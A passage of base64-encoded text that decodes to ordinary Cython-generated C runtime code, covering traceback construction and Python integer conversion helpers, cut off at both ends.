FkO1xuICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqb2xkX2NvZGVfb2JqZWN0ID0gY29kZV9vYmplY3Q7XG4gICAgICAgICAgICBjb2RlX29iamVjdCA9IF9fUHl4X1B5Q29kZV9SZXBsYWNlX0Zvcl9BZGRUcmFjZWJhY2soY29kZV9vYmplY3QsIGRpY3QsIHB5X3B5X2xpbmUsIHB5X2Z1bmNuYW1lKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihvbGRfY29kZV9vYmplY3QpO1xuICAgICAgICB9XG4gICAgICAgIGlmICh1bmxpa2VseSghY29kZV9vYmplY3QpKSBnb3RvIGJhZDtcbiAgICAgICAgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGNfbGluZSA/IC1jX2xpbmUgOiBweV9saW5lLCBjb2RlX29iamVjdCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgZGljdCA9IFB5RGljdF9OZXcoKTtcbiAgICB9XG4gICAgZ2V0ZnJhbWUgPSBQeVN5c19HZXRPYmplY3QoIl9nZXRmcmFtZSIpO1xuICAgIGlmICh1bmxpa2VseSghZ2V0ZnJhbWUpKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW1TdHJpbmcoZGljdCwgIl9nZXRmcmFtZSIsIGdldGZyYW1lKSkpIGdvdG8gYmFkO1xuICAgIGZyYW1lID0gUHlFdmFsX0V2YWxDb2RlKGNvZGVfb2JqZWN0LCBkaWN0LCBkaWN0KTtcbiAgICBpZiAodW5saWtlbHkoIWZyYW1lKSB8fCBmcmFtZSA9PSBQeV9Ob25lKSBnb3RvIGJhZDtcbiAgICBzdWNjZXNzID0gMTtcbiAgYmFkOlxuICAgIFB5RXJyX1Jlc3RvcmUoZXhjX3R5cGUsIGV4Y192YWx1ZSwgZXhjX3RyYWNlYmFjayk7XG4gICAgUHlfWERFQ1JFRihjb2RlX29iamVjdCk7XG4gICAgUHlfWERFQ1JFRihweV9weV9saW5lKTtcbiAgICBQeV9YREVDUkVGKHB5X2Z1bmNuYW1lKTtcbiAgICBQeV9YREVDUkVGKGRpY3QpO1xuICAgIFB5X1hERUNSRUYocmVwbGFjZSk7XG4gICAgaWYgKHN1Y2Nlc3MpIHtcbiAgICAgICAgUHlUcmFjZUJhY2tfSGVyZShcbiAgICAgICAgICAgIChzdHJ1Y3QgX2ZyYW1lKilmcmFtZSk7XG4gICAgfVxuICAgIFB5X1hERUNSRUYoZnJhbWUpO1xufVxuI2Vsc2VcbnN0YXRpYyBQeUNvZGVPYmplY3QqIF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RGb3JUcmFjZWJhY2soXG4gICAgICAgICAgICBjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSxcbiAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkge1xuICAgIFB5Q29kZU9iamVjdCAqcHlfY29kZSA9IE5VTEw7XG4gICAgUHlPYmplY3QgKnB5X2Z1bmNuYW1lID0gTlVMTDtcbiAgICBpZiAoY19saW5lKSB7XG4gICAgICAgIHB5X2Z1bmNuYW1lID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoICIlcyAoJXM6JWQpIiwgZnVuY25hbWUsIF9fcHl4X2NmaWxlbm0sIGNfbGluZSk7XG4gICAgICAgIGlmICghcHlfZnVuY25hbWUpIGdvdG8gYmFkO1xuICAgICAgICBmdW5jbmFtZSA9IFB5VW5pY29kZV9Bc1VURjgocHlfZnVuY25hbWUpO1xuICAgICAgICBpZiAoIWZ1bmNuYW1lKSBnb3RvIGJhZDtcbiAgICB9XG4gICAgcHlfY29kZSA9IFB5Q29kZV9OZXdFbXB0eShmaWxlbmFtZSwgZnVuY25hbWUsIHB5X2xpbmUpO1xuICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpO1xuICAgIHJldHVybiBweV9jb2RlO1xuYmFkOlxuICAgIFB5X1hERUNSRUYocHlfZnVuY25hbWUpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIHZvaWQgX19QeXhfQWRkVHJhY2ViYWNrKGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSkge1xuICAgIFB5Q29kZU9iamVjdCAqcHlfY29kZSA9IDA7XG4gICAgUHlGcmFtZU9iamVjdCAqcHlfZnJhbWUgPSAwO1xuICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDtcbiAgICBQeU9iamVjdCAqcHR5cGUsICpwdmFsdWUsICpwdHJhY2ViYWNrO1xuICAgIGlmIChjX2xpbmUpIHtcbiAgICAgICAgY19saW5lID0gX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2sodHN0YXRlLCBjX2xpbmUpO1xuICAgIH1cbiAgICBweV9jb2RlID0gX19weXhfZmluZF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSk7XG4gICAgaWYgKCFweV9jb2RlKSB7XG4gICAgICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZSh0c3RhdGUsICZwdHlwZSwgJnB2YWx1ZSwgJnB0cmFjZWJhY2spO1xuICAgICAgICBweV9jb2RlID0gX19QeXhfQ3JlYXRlQ29kZU9iamVjdEZvclRyYWNlYmFjayhcbiAgICAgICAgICAgIGZ1bmNuYW1lLCBjX2xpbmUsIHB5X2xpbmUsIGZpbGVuYW1lKTtcbiAgICAgICAgaWYgKCFweV9jb2RlKSB7XG4gICAgICAgICAgICBcbiAgICAgICAgICAgIFB5X1hERUNSRUYocHR5cGUpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihwdmFsdWUpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihwdHJhY2ViYWNrKTtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKHRzdGF0ZSwgcHR5cGUsIHB2YWx1ZSwgcHRyYWNlYmFjayk7XG4gICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgcHlfY29kZSk7XG4gICAgfVxuICAgIHB5X2ZyYW1lID0gUHlGcmFtZV9OZXcoXG4gICAgICAgIHRzdGF0ZSwgICAgICAgICAgICBcbiAgICAgICAgcHlfY29kZSwgICAgICAgICAgIFxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAgICBcbiAgICAgICAgMCAgICAgICAgICAgICAgICAgIFxuICAgICk7XG4gICAgaWYgKCFweV9mcmFtZSkgZ290byBiYWQ7XG4gICAgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKHB5X2ZyYW1lLCBweV9saW5lKTtcbiAgICBQeVRyYWNlQmFja19IZXJlKHB5X2ZyYW1lKTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKHB5X2NvZGUpO1xuICAgIFB5X1hERUNSRUYocHlfZnJhbWUpO1xufVxuI2VuZGlmXG5cblxuI2RlZmluZSBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVxcXG4gICAgX19QWVhfX1ZFUklGWV9SRVRVUk5fSU5UKHRhcmdldF90eXBlLCBmdW5jX3R5cGUsIGZ1bmNfdmFsdWUsIDApXG4jZGVmaW5lIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVxcXG4gICAgX19QWVhfX1ZFUklGWV9SRVRVUk5fSU5UKHRhcmdldF90eXBlLCBmdW5jX3R5cGUsIGZ1bmNfdmFsdWUsIDEpXG4jZGVmaW5lIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCBleGMpXFxcbiAgICB7XFxcbiAgICAgICAgZnVuY190eXBlIHZhbHVlID0gZnVuY192YWx1ZTtcXFxuICAgICAgICBpZiAoc2l6ZW9mKHRhcmdldF90eXBlKSA8IHNpemVvZihmdW5jX3R5cGUpKSB7XFxcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSh2YWx1ZSAhPSAoZnVuY190eXBlKSAodGFyZ2V0X3R5cGUpIHZhbHVlKSkge1xcXG4gICAgICAgICAgICAgICAgZnVuY190eXBlIHplcm8gPSAwO1xcXG4gICAgICAgICAgICAgICAgaWYgKGV4YyAmJiB1bmxpa2VseSh2YWx1ZSA9PSAoZnVuY190eXBlKS0xICYmIFB5RXJyX09jY3VycmVkKCkpKVxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAodGFyZ2V0X3R5cGUpIC0xO1xcXG4gICAgICAgICAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KHZhbHVlIDwgemVybykpXFxcbiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XFxcbiAgICAgICAgICAgICAgICBlbHNlXFxcbiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcXFxuICAgICAgICAgICAgfVxcXG4gICAgICAgIH1cXFxuICAgICAgICByZXR1cm4gKHRhcmdldF90eXBlKSB2YWx1ZTtcXFxuICAgIH1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0Zyb21fbG9uZyhsb25nIHZhbHVlKSB7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHB1c2hcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIlxuI2VuZGlmXG4gICAgY29uc3QgbG9uZyBuZWdfb25lID0gKGxvbmcpIC0xLCBjb25zdF96ZXJvID0gKGxvbmcpIDA7XG4jaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDXG4jcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcFxuI2VuZGlmXG4gICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87XG4gICAgaWYgKGlzX3Vuc2lnbmVkKSB7XG4gICAgICAgIGlmIChzaXplb2YobG9uZykgPCBzaXplb2YobG9uZykpIHtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTtcbiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZExvbmcoKHVuc2lnbmVkIGxvbmcpIHZhbHVlKTtcbiNpZiBkZWZpbmVkKEhBVkVfTE9OR19MT05HKSAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgIH0gZWxzZSBpZiAoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZExvbmdMb25nKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpIHZhbHVlKTtcbiNlbmRpZlxuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgICAgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpIHtcbiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTtcbiNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICB9IGVsc2UgaWYgKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkge1xuICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcoKFBZX0xPTkdfTE9ORykgdmFsdWUpO1xuI2VuZGlmXG4gICAgICAgIH1cbiAgICB9XG4gICAge1xuICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbHVlO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkKSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21VbnNpZ25lZE5hdGl2ZUJ5dGVzKGJ5dGVzLCBzaXplb2YodmFsdWUpLCAtMSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21OYXRpdmVCeXRlcyhieXRlcywgc2l6ZW9mKHZhbHVlKSwgLTEpO1xuICAgICAgICB9XG4jZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDBcbiAgICAgICAgaW50IG9uZSA9IDE7IGludCBsaXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7XG4gICAgICAgIHJldHVybiBfUHlMb25nX0Zyb21CeXRlQXJyYXkoYnl0ZXMsIHNpemVvZihsb25nKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXR0bGUsICFpc191bnNpZ25lZCk7XG4jZWxzZVxuICAgICAgICBpbnQgb25lID0gMTsgaW50IGxpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTtcbiAgICAgICAgUHlPYmplY3QgKmZyb21fYnl0ZXMsICpyZXN1bHQgPSBOVUxMLCAqa3dkcyA9IE5VTEw7XG4gICAgICAgIFB5T2JqZWN0ICpweV9ieXRlcyA9IE5VTEwsICpvcmRlcl9zdHIgPSBOVUxMO1xuICAgICAgICBmcm9tX2J5dGVzID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKSZQeUxvbmdfVHlwZSwgImZyb21fYnl0ZXMiKTtcbiAgICAgICAgaWYgKCFmcm9tX2J5dGVzKSByZXR1cm4gTlVMTDtcbiAgICAgICAgcHlfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKChjaGFyKilieXRlcywgc2l6ZW9mKGxvbmcpKTtcbiAgICAgICAgaWYgKCFweV9ieXRlcykgZ290byBsaW1pdGVkX2JhZDtcbiAgICAgICAgb3JkZXJfc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmcobGl0dGxlID8gImxpdHRsZSIgOiAiYmlnIik7XG4gICAgICAgIGlmICghb3JkZXJfc3RyKSBnb3RvIGxpbWl0ZWRfYmFkO1xuICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqYXJnc1szKyhDWVRIT05fVkVDVE9SQ0FMTCA/IDEgOiAwKV0gPSB7IE5VTEwsIHB5X2J5dGVzLCBvcmRlcl9zdHIgfTtcbiAgICAgICAgICAgIGlmICghaXNfdW5zaWduZWQpIHtcbiAgICAgICAgICAgICAgICBrd2RzID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTtcbiAgICAgICAgICAgICAgICBpZiAoIWt3ZHMpIGdvdG8gbGltaXRlZF9iYWQ7XG4gICAgICAgICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cigic2lnbmVkIiwgX19QeXhfTmV3UmVmKFB5X1RydWUpLCBrd2RzLCBhcmdzKzMsIDApIDwgMCkgZ290byBsaW1pdGVkX2JhZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihmcm9tX2J5dGVzLCBhcmdzKzEsIDIgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQsIGt3ZHMpO1xuICAgICAgICB9XG4gICAgICAgIGxpbWl0ZWRfYmFkOlxuICAgICAgICBQeV9YREVDUkVGKGt3ZHMpO1xuICAgICAgICBQeV9YREVDUkVGKG9yZGVyX3N0cik7XG4gICAgICAgIFB5X1hERUNSRUYocHlfYnl0ZXMpO1xuICAgICAgICBQeV9YREVDUkVGKGZyb21fYnl0ZXMpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuI2VuZGlmXG4gICAgfVxufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGxvbmcgX19QeXhfUHlMb25nX0FzX2xvbmcoUHlPYmplY3QgKngpIHtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaFxuI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBpZ25vcmVkICItV2NvbnZlcnNpb24iXG4jZW5kaWZcbiAgICBjb25zdCBsb25nIG5lZ19vbmUgPSAobG9uZykgLTEsIGNvbnN0X3plcm8gPSAobG9uZykgMDtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wXG4jZW5kaWZcbiAgICBjb25zdCBpbnQgaXNfdW5zaWduZWQgPSBuZWdfb25lID4gY29uc3RfemVybztcbiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHtcbiAgICAgICAgbG9uZyB2YWw7XG4gICAgICAgIFB5T2JqZWN0ICp0bXAgPSBfX1B5eF9QeU51bWJlcl9Mb25nKHgpO1xuICAgICAgICBpZiAoIXRtcCkgcmV0dXJuIChsb25nKSAtMTtcbiAgICAgICAgdmFsID0gX19QeXhfUHlMb25nX0FzX2xvbmcodG1wKTtcbiAgICAgICAgUHlfREVDUkVGKHRtcCk7XG4gICAgICAgIHJldHVybiB2YWw7XG4gICAgfVxuICAgIGlmIChpc191bnNpZ25lZCkge1xuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlMb25nX0lzTmVnKHgpKSkge1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgX19QeXhfY29tcGFjdF91cHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkpXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTtcbiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpO1xuICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSkge1xuICAgICAgICAgICAgICAgIGNhc2UgMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMSAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSA+PSAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE3XG4gICAgICAgIGlmICh1bmxpa2VseShQeV9TSVpFKHgpIDwgMCkpIHtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9XG4jZWxzZVxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHgsIFB5X0ZhbHNlLCBQeV9MVCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gMSkpXG4gICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgbG9uZykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgdW5zaWduZWQgbG9uZywgUHlMb25nX0FzVW5zaWduZWRMb25nKHgpKVxuI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgUFlfTE9OR19MT05HKSkpIHtcbiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhsb25nLCB1bnNpZ25lZCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZ0xvbmcoeCkpXG4jZW5kaWZcbiAgICAgICAgfVxuICAgIH0gZWxzZSB7XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBfX1B5eF9jb21wYWN0X3B5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSlcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7XG4gICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KHgpKSB7XG4gICAgICAgICAgICAgICAgY2FzZSAtMjpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAg